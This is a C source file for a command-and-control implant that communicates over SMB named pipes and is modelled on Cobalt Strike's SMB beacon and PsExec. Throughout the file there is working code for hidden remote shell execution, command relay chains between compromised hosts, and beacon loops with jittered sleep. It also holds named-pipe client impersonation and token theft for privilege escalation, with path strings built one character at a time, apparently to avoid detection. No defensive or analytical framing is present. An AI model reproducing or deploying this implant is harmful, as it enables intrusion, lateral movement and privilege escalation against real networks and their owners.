/*
 * SMB Communication - Named Pipe C2
 * Cobalt Strike SMB beacon, PsExec patterns
 */

#include <windows.h>

// ============================================================================
// CONFIG
// ============================================================================

#define BUFSZ 0x10000

#pragma pack(push,1)
typedef struct {
    DWORD cmd;
    DWORD len;
} PIPE_HDR;

typedef struct {
    char name[64];
    DWORD timeout;
    DWORD maxinst;
} PIPE_CFG;
#pragma pack(pop)

// ============================================================================
// PIPE SERVER
// ============================================================================

HANDLE pipe_create(char* name)
{
    char path[128];
    path[0] = '\\'; path[1] = '\\'; path[2] = '.';
    path[3] = '\\'; path[4] = 'p'; path[5] = 'i';
    path[6] = 'p'; path[7] = 'e'; path[8] = '\\';
    int i = 9;
    while(*name) path[i++] = *name++;
    path[i] = 0;

    return CreateNamedPipeA(path,
        0x3,        // PIPE_ACCESS_DUPLEX
        0x4 | 0x2,  // TYPE_MESSAGE | READMODE_MESSAGE
        0xFF,       // PIPE_UNLIMITED_INSTANCES
        BUFSZ, BUFSZ, 0, 0);
}

BOOL pipe_wait(HANDLE hP)
{
    if(!ConnectNamedPipe(hP, 0))
        return GetLastError() == 535;  // ERROR_PIPE_CONNECTED
    return 1;
}

// ============================================================================
// PIPE CLIENT
// ============================================================================

HANDLE pipe_connect(char* server, char* name)
{
    char path[256];
    int i = 0;

    if(server) {
        path[i++] = '\\'; path[i++] = '\\';
        while(*server) path[i++] = *server++;
    } else {
        path[i++] = '\\'; path[i++] = '\\';
        path[i++] = '.';
    }
    path[i++] = '\\'; path[i++] = 'p'; path[i++] = 'i';
    path[i++] = 'p'; path[i++] = 'e'; path[i++] = '\\';
    while(*name) path[i++] = *name++;
    path[i] = 0;

    HANDLE hP = CreateFileA(path, 0xC0000000, 0, 0, 3, 0, 0);  // GENERIC_RW, OPEN_EXISTING
    if(hP == INVALID_HANDLE_VALUE) return 0;

    DWORD mode = 2;  // PIPE_READMODE_MESSAGE
    SetNamedPipeHandleState(hP, &mode, 0, 0);

    return hP;
}

// ============================================================================
// PIPE I/O
// ============================================================================

BOOL pipe_send(HANDLE hP, DWORD cmd, BYTE* data, DWORD len)
{
    BYTE buf[BUFSZ];
    PIPE_HDR* hdr = (PIPE_HDR*)buf;
    hdr->cmd = cmd;
    hdr->len = len;

    if(data && len > 0) {
        for(DWORD i = 0; i < len && i < BUFSZ - sizeof(PIPE_HDR); i++)
            buf[sizeof(PIPE_HDR) + i] = data[i];
    }

    DWORD wr;
    return WriteFile(hP, buf, sizeof(PIPE_HDR) + len, &wr, 0);
}

BOOL pipe_recv(HANDLE hP, DWORD* cmd, BYTE** data, DWORD* len)
{
    static BYTE buf[BUFSZ];
    DWORD rd;

    if(!ReadFile(hP, buf, BUFSZ, &rd, 0) || rd < sizeof(PIPE_HDR))
        return 0;

    PIPE_HDR* hdr = (PIPE_HDR*)buf;
    *cmd = hdr->cmd;
    *len = hdr->len;
    *data = buf + sizeof(PIPE_HDR);

    return 1;
}

// ============================================================================
// COMMAND EXECUTION
// ============================================================================

DWORD exec_cmd(char* cmd, BYTE* out, DWORD maxlen)
{
    SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};
    HANDLE hR, hW;
    CreatePipe(&hR, &hW, &sa, 0);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = 0x100;  // STARTF_USESTDHANDLES
    si.hStdOutput = hW;
    si.hStdError = hW;

    char exec[4096];
    char* p = exec;
    char* s = "cmd.exe /c ";
    while(*s) *p++ = *s++;
    while(*cmd) *p++ = *cmd++;
    *p = 0;

    DWORD total = 0;
    if(CreateProcessA(0, exec, 0, 0, 1, 0x08000000, 0, 0, &si, &pi)) {
        CloseHandle(hW);
        DWORD rd;
        while(ReadFile(hR, out + total, maxlen - total, &rd, 0) && rd)
            total += rd;
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(hR);
    return total;
}

// ============================================================================
// PIPE SERVER LOOP
// ============================================================================

void pipe_server(char* name)
{
    HANDLE hP = pipe_create(name);
    if(!hP || hP == INVALID_HANDLE_VALUE) return;

    while(1) {
        if(!pipe_wait(hP)) continue;

        DWORD cmd;
        BYTE* data;
        DWORD len;

        while(pipe_recv(hP, &cmd, &data, &len)) {
            BYTE result[BUFSZ];
            DWORD rlen = 0;

            switch(cmd) {
                case 0x01:  // Ping
                    result[0] = 'P'; result[1] = 'O';
                    result[2] = 'N'; result[3] = 'G';
                    rlen = 4;
                    break;

                case 0x10:  // Shell
                    data[len] = 0;
                    rlen = exec_cmd((char*)data, result, BUFSZ);
                    break;

                case 0xFF:  // Exit
                    pipe_send(hP, cmd, 0, 0);
                    goto end;
            }

            pipe_send(hP, cmd, result, rlen);
        }

        DisconnectNamedPipe(hP);
    }

end:
    CloseHandle(hP);
}

// ============================================================================
// REMOTE PIPE EXEC
// ============================================================================

BOOL pipe_remote(char* target, char* pipename, char* cmd, BYTE* out, DWORD* olen)
{
    HANDLE hP = pipe_connect(target, pipename);
    if(!hP) return 0;

    pipe_send(hP, 0x10, (BYTE*)cmd, 0);
    while(cmd[*olen]) (*olen)++;

    DWORD rcmd;
    BYTE* rdata;
    DWORD rlen;

    if(pipe_recv(hP, &rcmd, &rdata, &rlen)) {
        for(DWORD i = 0; i < rlen; i++) out[i] = rdata[i];
        *olen = rlen;
    }

    CloseHandle(hP);
    return 1;
}

// ============================================================================
// P2P CHAIN
// ============================================================================

typedef struct _CHAIN {
    char parent[128];   // Parent pipe
    char local[64];     // Local pipe
    HANDLE hParent;
    HANDLE hLocal;
} CHAIN;

void chain_beacon(CHAIN* cfg)
{
    cfg->hLocal = pipe_create(cfg->local);
    if(!cfg->hLocal) return;

    // Connect to parent if specified
    if(cfg->parent[0]) {
        cfg->hParent = pipe_connect(0, cfg->parent);
    }

    while(1) {
        if(!pipe_wait(cfg->hLocal)) continue;

        DWORD cmd;
        BYTE* data;
        DWORD len;

        while(pipe_recv(cfg->hLocal, &cmd, &data, &len)) {
            BYTE result[BUFSZ];
            DWORD rlen = 0;

            // Forward to parent or execute locally
            if(cfg->hParent && cmd == 0xF0) {
                // Forward command up chain
                pipe_send(cfg->hParent, 0x10, data, len);

                DWORD rcmd;
                BYTE* rdata;
                DWORD rl;
                if(pipe_recv(cfg->hParent, &rcmd, &rdata, &rl)) {
                    pipe_send(cfg->hLocal, rcmd, rdata, rl);
                    continue;
                }
            }

            // Local execution
            if(cmd == 0x10) {
                data[len] = 0;
                rlen = exec_cmd((char*)data, result, BUFSZ);
            }

            pipe_send(cfg->hLocal, cmd, result, rlen);
        }

        DisconnectNamedPipe(cfg->hLocal);
    }
}

// ============================================================================
// IMPERSONATION
// ============================================================================

BOOL pipe_impersonate(char* name, DWORD timeout_ms)
{
    HANDLE hP = pipe_create(name);
    if(!hP || hP == INVALID_HANDLE_VALUE) return 0;

    // Set timeout
    OVERLAPPED ov = {0};
    ov.hEvent = CreateEventA(0, 1, 0, 0);

    ConnectNamedPipe(hP, &ov);
    if(WaitForSingleObject(ov.hEvent, timeout_ms) != 0) {
        CloseHandle(hP);
        CloseHandle(ov.hEvent);
        return 0;
    }

    // Read trigger
    BYTE buf[256];
    DWORD rd;
    ReadFile(hP, buf, sizeof(buf), &rd, 0);

    // Impersonate!
    BOOL ret = ImpersonateNamedPipeClient(hP);

    if(ret) {
        // Now running as client
        // Can access their resources, tokens, etc.

        // Get impersonated user
        char user[256];
        DWORD sz = sizeof(user);
        GetUserNameA(user, &sz);

        // Do privileged work...

        RevertToSelf();
    }

    DisconnectNamedPipe(hP);
    CloseHandle(hP);
    CloseHandle(ov.hEvent);

    return ret;
}

// ============================================================================
// TOKEN DUPLICATION
// ============================================================================

HANDLE pipe_steal_token(char* name)
{
    HANDLE hP = pipe_create(name);
    if(!hP) return 0;

    pipe_wait(hP);

    BYTE buf[256];
    DWORD rd;
    ReadFile(hP, buf, sizeof(buf), &rd, 0);

    ImpersonateNamedPipeClient(hP);

    // Duplicate token
    HANDLE hToken = 0, hDup = 0;
    if(OpenThreadToken(GetCurrentThread(), 0x0002, 0, &hToken)) {  // TOKEN_DUPLICATE
        DuplicateTokenEx(hToken, 0x02000000, 0, 2, 1, &hDup);  // MAXIMUM_ALLOWED, Impersonation, Primary
        CloseHandle(hToken);
    }

    RevertToSelf();
    DisconnectNamedPipe(hP);
    CloseHandle(hP);

    return hDup;
}

// ============================================================================
// SMB BEACON LOOP
// ============================================================================

void smb_beacon(char* pipename, DWORD sleep_ms)
{
    HANDLE hP = pipe_create(pipename);
    if(!hP) return;

    while(1) {
        if(!pipe_wait(hP)) {
            Sleep(sleep_ms);
            continue;
        }

        DWORD cmd;
        BYTE* data;
        DWORD len;

        while(pipe_recv(hP, &cmd, &data, &len)) {
            BYTE result[BUFSZ];
            DWORD rlen = 0;

            switch(cmd) {
                case 0x01:  // Ping
                    result[0] = 'O'; result[1] = 'K';
                    rlen = 2;
                    break;

                case 0x02:  // Sleep
                    if(len >= 4) sleep_ms = *(DWORD*)data;
                    break;

                case 0x10:  // Shell
                    data[len] = 0;
                    rlen = exec_cmd((char*)data, result, BUFSZ);
                    break;

                case 0xFF:  // Exit
                    pipe_send(hP, cmd, 0, 0);
                    CloseHandle(hP);
                    return;
            }

            pipe_send(hP, cmd, result, rlen);
        }

        DisconnectNamedPipe(hP);
        Sleep(sleep_ms + (GetTickCount() % (sleep_ms / 4)));
    }
}

// ============================================================================
// EOF
// ============================================================================
